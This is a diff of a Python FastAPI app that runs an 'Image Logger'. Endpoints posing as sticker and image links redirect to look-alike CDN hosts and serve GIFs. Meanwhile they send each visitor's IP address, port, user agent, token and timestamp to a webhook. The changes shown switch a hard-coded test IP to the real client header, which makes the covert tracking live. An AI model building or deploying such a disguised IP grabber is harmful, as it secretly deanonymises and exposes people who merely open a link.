@@ -63,8 +63,8 @@ async def db_session_middleware(request: Request, call_next):
     return response 
 @app.middleware("http")
 async def log_ip(request: Request, call_next):
-    # ip = request.headers['x-real-ip']
-    ip= '123.18.143.95'
+    ip = request.headers['x-real-ip']
+    # ip= '123.18.143.95'
     port= request.client.port
     timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))
     request.state.ip = ip
@@ -89,7 +89,7 @@ async def redirect_image(background_tasks: BackgroundTasks,request: Request, url
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
     return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
 @app.get("/emoticon/sticker/webpc")
-async def redirect_image(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
+async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
     ip = request.state.ip
     timestamp = request.state.timestamp
     port = request.state.port
@@ -148,7 +148,7 @@ async def get_image(background_tasks: BackgroundTasks,request: Request, filename
             background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Cảnh báo server configuration',db=db)
             response = FileResponse(f'{uri_path}taylor.gif', media_type="image/gif")
             return response
-    background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Image Logger', db=db)
+        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Image Logger', db=db)
     response = FileResponse(image_path, media_type="image/gif")
     return response
 '''
